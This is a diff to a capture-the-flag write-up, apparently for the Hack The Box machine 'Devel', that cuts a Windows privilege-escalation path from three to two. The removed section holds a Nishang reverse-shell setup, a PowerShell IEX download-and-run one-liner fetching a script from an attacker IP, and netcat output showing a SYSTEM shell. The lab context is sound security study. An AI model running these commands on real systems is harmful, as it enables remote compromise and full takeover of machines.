@@ -157,7 +157,7 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 
 ```
 
-Based on the system information and user privileges there are three different privilege escalation paths.
+Based on the system information and user privileges there are two different privilege escalation paths.
 
 ## Path 1: JuicyPotato
 
@@ -289,38 +289,4 @@ c:\Windows\System32>whoami
 whoami
 nt authority\system
 
-```
-
-## Path 3: Nishang InvokePowerShellTcp.ps1
-
-Copy InvokePowerShellTcp.ps1 from /opt/tools/nishang
-
-```bash
-┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
-└─$ cp /opt/tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
-
-```
-
-Edit and place the following at the bottom of the script
-
-```bash
-Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 9002
-```
-
-Upload to the target into IEX which executes the script and results in the netcat listener getting a reverse shell as system user.
-
-```bash
-powershell iex(new-object net.webclient).downloadstring('http://10.10.14.9/Invoke-PowerShellTcp.ps1')
-
-# Receive reverse shell on second netcat listener
-┌──(vagrant㉿kali)-[~/Documents/HTB/windows/devel]
-└─$ nc -nlvp 9002
-listening on [any] 9002 ...
-connect to [10.10.14.9] from (UNKNOWN) [10.129.46.239] 49206
-Microsoft Windows [Version 6.1.7600]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\Windows\system32>whoami
-whoami
-nt authority\system
 ```
